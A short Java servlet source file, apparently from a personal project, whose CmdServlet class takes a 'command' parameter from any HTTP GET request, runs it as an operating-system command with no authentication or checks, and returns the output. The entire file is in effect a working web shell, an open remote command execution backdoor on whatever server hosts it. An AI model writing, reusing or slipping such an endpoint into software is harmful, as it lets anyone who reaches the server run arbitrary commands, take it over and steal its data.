package com.dassader.servlet;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * Created by swift-seeker-89717 on 25.04.2015.
 */
public class CmdServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String command = req.getParameter("command");
        if (command != null) {
            String line;
            Process p = Runtime.getRuntime().exec(command);
            StringBuilder builder = new StringBuilder();
            BufferedReader input =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = input.readLine()) != null) {
                builder.append(line);
                builder.append("\n");
            }
            input.close();
            resp.getWriter().write(builder.toString());
        }
        resp.getWriter().write("<h1>Bed request</h1>");
    }
}
